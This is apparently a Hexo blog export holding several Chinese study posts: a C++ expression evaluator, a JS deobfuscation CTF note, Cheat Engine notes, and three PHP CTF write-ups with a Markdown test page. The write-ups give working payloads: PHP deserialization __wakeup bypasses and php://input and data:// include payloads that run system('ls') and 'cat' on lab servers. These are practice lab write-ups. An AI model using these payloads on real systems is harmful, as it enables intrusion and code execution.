class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">			OPNR.<span class="built_in">push</span>(a*b);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(c ==<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">			OPNR.<span class="built_in">push</span>(b/a);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">			OPNR.<span class="built_in">push</span>(b%a);</span><br><span class="line">		OPTR.<span class="built_in">pop</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	OPTR.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">ispandicp</span>();</span><br><span class="line">	<span class="comment">//cout&lt;&lt;isp[&#x27;)&#x27;]&lt;&lt;endl;</span></span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;请输入一串表达式,以#号结束&quot;</span>&lt;&lt;endl;</span><br><span class="line">	OPTR.<span class="built_in">push</span>(<span class="string">&#x27;#&#x27;</span>); </span><br><span class="line">	<span class="keyword">char</span> ch[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">gets</span>(ch);</span><br><span class="line">	<span class="keyword">int</span> len=<span class="built_in">strlen</span>(ch)<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span>(ch[len]!=<span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请加入#&quot;</span>);</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>((ch[len+<span class="number">1</span>]=<span class="built_in">getchar</span>() )!=<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;请加入#\n&quot;</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(ch[i]!=<span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(ch[i]==<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(ch[i]==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">			<span class="built_in">count</span>(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(ch[i]==<span class="string">&#x27;*&#x27;</span> || ch[i]==<span class="string">&#x27;(&#x27;</span> || ch[i]==<span class="string">&#x27;/&#x27;</span> || ch[i]==<span class="string">&#x27;%&#x27;</span> ||ch[i]==<span class="string">&#x27;+&#x27;</span>||ch[i] ==<span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">			<span class="comment">//printf(&quot;icp[ch]:%d isp[OPTR.top()]:%d\n&quot;,icp[ch],isp[OPTR.top()]);</span></span><br><span class="line">			<span class="keyword">if</span>(icp[ch[i]]&gt;isp[OPTR.<span class="built_in">top</span>()])&#123;</span><br><span class="line">				OPTR.<span class="built_in">push</span>(ch[i]);</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">int</span> a=OPNR.<span class="built_in">top</span>();</span><br><span class="line">				OPNR.<span class="built_in">pop</span>();</span><br><span class="line">				<span class="keyword">int</span> b=OPNR.<span class="built_in">top</span>();</span><br><span class="line">				OPNR.<span class="built_in">pop</span>();</span><br><span class="line">				<span class="keyword">char</span> c=OPTR.<span class="built_in">top</span>();</span><br><span class="line">				<span class="keyword">if</span>(c==<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">					OPNR.<span class="built_in">push</span>(a+b);</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">					OPNR.<span class="built_in">push</span>(b-a);</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">					OPNR.<span class="built_in">push</span>(a*b);</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(c ==<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">					OPNR.<span class="built_in">push</span>(b/a);</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">					OPNR.<span class="built_in">push</span>(b%a);</span><br><span class="line">				<span class="comment">//printf(&quot;opnr: %d optr: %c &quot;,OPNR.top(),OPTR.top());	</span></span><br><span class="line">				OPTR.<span class="built_in">pop</span>();</span><br><span class="line">				<span class="comment">//printf(&quot;oprt: %c push: %c\n&quot;,OPTR.top(),c);</span></span><br><span class="line">				OPTR.<span class="built_in">push</span>(ch[i]);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(ch[i]==<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(ch[i]&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; ch[i]&lt;=<span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">			<span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span>(ch[i]&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; ch[i]&lt;=<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">				num=num*<span class="number">10</span>+ch[i++]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">			OPNR.<span class="built_in">push</span>(num);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			cout&lt;&lt;<span class="string">&quot;&#x27;&quot;</span>&lt;&lt;ch[i]&lt;&lt;<span class="string">&quot;&#x27;&quot;</span>&lt;&lt;<span class="string">&quot;为非法字符,已过滤&quot;</span>&lt;&lt;endl;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">count</span>(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">	cout&lt;&lt;OPNR.<span class="built_in">top</span>()&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="扩展任务1"><a href="#扩展任务1" class="headerlink" title="扩展任务1:"></a>扩展任务1:</h2><h3 id="较复杂的表达式求值和交互式求值"><a href="#较复杂的表达式求值和交互式求值" class="headerlink" title="较复杂的表达式求值和交互式求值:"></a>较复杂的表达式求值和交互式求值:</h3><p>​    难,需要模板实现:</p>
]]></content>
      <tags>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>JS乱码问题</title>
    <url>/2022/03/02/Study/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h3 id="JS乱码问题"><a href="#JS乱码问题" class="headerlink" title="JS乱码问题"></a>JS乱码问题</h3><p><img src="/2022/03/02/Study/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/image-20220302143813041.png" alt="image-20220302143813041"></p>
<p>打开一个附件<br> <a href="..\..\..\FX\FanXIngX\646ecdf05af7490a85bb5c8ccb96c102(1">646ecdf05af7490a85bb5c8ccb96c102(1).zip</a>.zip) </p>
<p><img src="/2022/03/02/Study/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/image-20220302143905163.png" alt="image-20220302143905163"></p>
<p>用TXT文档打开后发现乱码。<br>script 看得出是js脚本<br>添加后缀名：.html</p>
<p>用浏览器打开</p>
<hr>
<p>分析代码：</p>
<p><img src="/2022/03/02/Study/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/image-20220302144157222.png" alt="image-20220302144157222"></p>
<p><strong>利用console.log( ) 在浏览器中调试代码 显现出正确代码（核心）</strong></p>
<p>将eval(_) 改为console.log(_) 然后 吧script指示删除。</p>
<p>打开浏览器控制台。</p>
<hr>
<p><img src="/2022/03/02/Study/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/image-20220302144543359.png" alt="image-20220302144543359"></p>
<p>看见正确的代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">&quot;c&quot;</span>).value;<span class="comment">//获取c中ID的值，也就是按钮的值</span></span><br><span class="line">    <span class="keyword">if</span>(e.length==<span class="number">16</span>) <span class="comment">//对e输入的字符串长度需要为16</span></span><br><span class="line">        <span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)<span class="comment">//打开正则表达式表格。匹配开头为be0f23</span></span><br><span class="line">            <span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)<span class="comment">//匹配233ac</span></span><br><span class="line">                <span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)<span class="comment">//匹配e98aa结束</span></span><br><span class="line">                    <span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)<span class="comment">//匹配c7be9 如果输入的e满足这五个if，就能返回flag</span></span><br><span class="line">                                            <span class="comment">//根据首位确定凑出e的值 be0f233ac7be98aa</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span><br><span class="line">                            <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                            <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span><br><span class="line">                            <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                            <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">                                s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>) <span class="comment">//返回flag</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;buttononclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);<span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure>
<p>稍微整理一下</p>
<p>分析代码即可获得答案.</p>
]]></content>
  </entry>
  <entry>
    <title>CE的工作原理 笔记</title>
    <url>/2022/02/17/Study/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="第一部分：基础知识-计算机是如何运行游戏的"><a href="#第一部分：基础知识-计算机是如何运行游戏的" class="headerlink" title="第一部分：基础知识-计算机是如何运行游戏的"></a>第一部分：基础知识-计算机是如何运行游戏的</h2><p>总结:</p>
<p><img src="/2022/02/17/Study/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217155807949.png" alt="image-20220217155807949"></p>
<h2 id="第二部分：基础知识-CE的工作原理"><a href="#第二部分：基础知识-CE的工作原理" class="headerlink" title="第二部分：基础知识-CE的工作原理"></a>第二部分：基础知识-CE的工作原理</h2><p>CE监控游戏的内存，并对其进行任意的修改。<img src="/2022/02/17/Study/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217160325859.png" alt="image-20220217160325859"></p>
<p><img src="/2022/02/17/Study/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217160630264.png" alt="image-20220217160630264"></p>
<p>修改的一般思路：去哪里 干什么</p>
<h2 id="第三部分：基础知识-二进制的表示"><a href="#第三部分：基础知识-二进制的表示" class="headerlink" title="第三部分：基础知识-二进制的表示"></a>第三部分：基础知识-二进制的表示</h2><p>十六进制数表示二进制数</p>
<p>0-F对应 1-15；</p>
<h2 id="第四部分数据：修改-基本操作"><a href="#第四部分数据：修改-基本操作" class="headerlink" title="第四部分数据：修改-基本操作"></a>第四部分数据：修改-基本操作</h2><p><img src="/2022/02/17/Study/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217161151056.png" alt="image-20220217161151056"></p>
<h2 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h2>]]></content>
  </entry>
  <entry>
    <title>unserialize3 wp</title>
    <url>/2022/01/16/Study/unserialize3/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
<p>审计源码，看见__wakeup 以及题目unserialize3 猜想依旧是反序列化漏洞</p>
<p><strong>这里需要用到CVE-2016-7124漏洞</strong></p>
<blockquote>
<p>当序列化字符串中表示对象属性个数大于真实的属性个数或值类型不匹配时会跳过__wakeup的执行.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class xctf&#123;</span><br><span class="line">	public $flag = &#x27;111&#x27;;</span><br><span class="line">	public function __wakeup()&#123;</span><br><span class="line">	exit(&#x27;bad requests&#x27;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	$b=serialize(new xctf);</span><br><span class="line">	echo ($b);</span><br><span class="line">?&gt;</span><br><span class="line">输出结果:</span><br><span class="line">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">改为</span><br><span class="line">O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">浏览器输入</span><br><span class="line">http://111.200.241.244:64582/index.php?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/16/Study/unserialize3/image-20220116235331921.png" alt="image-20220116235331921"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>XTCTF Web_php_include</title>
    <url>/2022/01/16/Study/Web_php_include/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];<span class="comment">//显示GET请求后hello的值</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];<span class="comment">//对page进行GET请求，赋值给page</span></span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;<span class="comment">//把page和php：// 比较，若page中第一次出现php://，则把php://替代为空</span></span><br><span class="line">    <span class="variable">$page</span>=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);<span class="comment">//包含page</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>打开网页 审计源码。</p>
<p>由题目Web_php_include可知，该题可能是php中include的漏洞</p>
<p>百度include漏洞，<a href="https://www.freebuf.com/articles/others-articles/256524.html">参考</a>  可知可以利用 php伪协议进行漏洞利用 <a href="https://www.cnblogs.com/weak-chicken/p/12275806.html">参考</a></p>
<p>解法1：</p>
<p>​    注意到strstr函数对大小写非常敏感<img src="/2022/01/16/Study/Web_php_include/image-20220116232319078.png" alt="image-20220116232319078" style="zoom:50%;"></p>
<p>我们则可以进行php://伪协议时，可以大写PHP，进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=PHP://input </span><br><span class="line">[POST请求] &lt;?php system(&quot;ls&quot;);?&gt;  #列出文件列表 后发现在fl4gisisish3r3.php中</span><br><span class="line">           &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt; #打开文件，发现flag</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/16/Study/Web_php_include/image-20220116233217504.png" alt="image-20220116233217504"></p>
<p>第二解法：</p>
<p>​    利用data://伪协议绕过php协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=data://text//plain,%3C?php%20system(%22ls%22);?%3E</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/16/Study/Web_php_include/image-20220116233423685.png" alt="image-20220116233423685"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=data://text//plain,%3C?php%20system(%22cat%20fl4gisisish3r3.php%22);?%3E（同第一种解法）</span><br><span class="line">可在源文件中找到flag</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_php_unserialize wp</title>
    <url>/2022/01/15/Study/Web_php_unserialize/</url>
    <content><![CDATA[<h3 id="攻防世界-Web-php-unserialize-wp"><a href="#攻防世界-Web-php-unserialize-wp" class="headerlink" title="攻防世界:Web_php_unserialize wp"></a>攻防世界:Web_php_unserialize wp</h3><p>由题可知道，该题为php反序列化漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>审计代码。发现有几处函数不懂。通过查阅资料可知</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__destruct()：析构函数</span><br><span class="line">构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。</span><br><span class="line">在 PHP 中有一种垃圾回收机制，当对象不能被访问时就会自动启动垃圾回收机制，收回对象占用的内存空间。</span><br><span class="line">而析构函数正是在垃圾回收机制回收对象之前调用的。</span><br><span class="line">简而言之。 destruct在最后执行。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup() 在执行unserialize($var);前，会执行__wakeup()函数。因此需要绕过。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">isset(变量): 判读变量值是否为NULL（&quot;\0&quot;），若是，则返回false。否则返回true.</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match():正则匹配模式，匹配var变量中是否有 [oc]:\d+:</span><br><span class="line">我们需要明白OC匹配模式的规则</span><br><span class="line">正则表达式：是指一个用来描述或者匹配一系列符合某个句法规则的字符串的单个字符串，简单说，就是我们写个模板，然后去匹配字符串。</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/15/Study/Web_php_unserialize/image-20220115141748577.png" alt="image-20220115141748577"></p>
<p>附匹配规则表</p>
<p>第12行可知，flag很可能在fl4g.php中<img src="/2022/01/15/Study/Web_php_unserialize/image-20220115141815743.png" alt="image-20220115141815743" style="zoom:50%;"></p>
<p>添加/fl4g.php 网页空白。<br>其实是在Demo类中，执行了wakeup()，使得file强制赋值为了index.php.</p>
<p>我们需要GET请求var值绕过preg_match和wakeup()。</p>
<p><img src="/2022/01/15/Study/Web_php_unserialize/image-20220115014622417.png" alt="image-20220115014622417"></p>
<p>我们可以利用CVE-2016漏洞跳过wakeup()</p>
<p>由于本人毫无写php的基础。因此附上网上wp的php脚本进行分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">      <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个对象,并且创建对象时，自动且先调用了__construct函数，</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);<span class="comment">//把$file赋值为&#x27;fl4g.php&#x27;</span></span><br><span class="line"><span class="comment">#进行序列化</span></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">#使用str_replace() 函数进行替换，来绕过正则表达式的检查</span></span><br><span class="line"><span class="comment">#  /[oc]:\d+:/i   意思为，在var中匹配 &quot;o(或者c或者oc):%d:&quot; 若匹配成功则不返回0.</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;O:4:&#x27;</span>,<span class="string">&#x27;O:+4:&#x27;</span>,<span class="variable">$a</span>);<span class="comment">//讲4改为+4 使得匹配不到 o:4:</span></span><br><span class="line"><span class="comment">#使用str_replace() 函数进行替换，来绕过__wakeup()魔法函数</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#再进行base64编码,输出的结果为flag</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#扔到在线编译器结果为</span></span><br><span class="line">TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br><span class="line">   <span class="comment">#获得flag</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Test</title>
    <url>/1970/01/01/%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><p><strong>粗体</strong></p>
<p><em>斜体</em></p>
<span id="more"></span> 
<p>More 一下</p>
<p><del>删除线</del></p>
<hr>
<hr>
<blockquote>
<p>引用<br>换行</p>
<p>分段<br>引用<br>换行</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">表头 1</th>
<th style="text-align:center">表头 2</th>
<th style="text-align:right">表头 3</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">靠左对齐</td>
<td style="text-align:center">居中对齐</td>
<td style="text-align:right">靠右对齐</td>
</tr>
</tbody>
</table>
</div>
<p><code>inline code</code></p>
<p><code>inline code with $LaTeX$ (should not be parsed)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># A code example</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello world!&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>$Inline \: \LaTeX$</p>
<p>$一个公式:f(x,y) = 3$</p>
<p>正整数立方和求和公式：</p>
<script type="math/tex; mode=display">
\begin{aligned}
\sum_{i=1}^n i^3
&=(\sum_{i=1}^n i)^2 \\
&=\frac {n^2(n+1)^2}4 \\
\end{aligned}</script><p>欧拉函数的性质之一：</p>
<script type="math/tex; mode=display">
\begin{aligned}
    \varphi \: * \: I &= id \\
\sum_{d|n} \varphi(d) &= n \\
\end{aligned}</script><p>It was terribly cold and nearly dark on the last evening of the old year, and the snow was falling fast. In the cold and the darkness, a poor little girl, with bare head and naked feet, roamed through the streets. It is true she had on a pair of slippers when she left home, but they were not of much use. They were very large, so large, indeed, that they had belonged to her mother, and the poor little creature had lost them in running across the street to avoid two carriages that were rolling along at a terrible rate. One of the slippers she could not find, and a boy seized upon the other and ran away with it, saying that he could use it as a cradle, when he had children of his own. So the little girl went on with her little naked feet, which were quite red and blue with the cold. In an old apron she carried a number of matches, and had a bundle of them in her hands. No one had bought anything of her the whole day, nor had anyone given her even a penny. Shivering with cold and hunger, she crept along; poor little child, she looked the picture of misery. 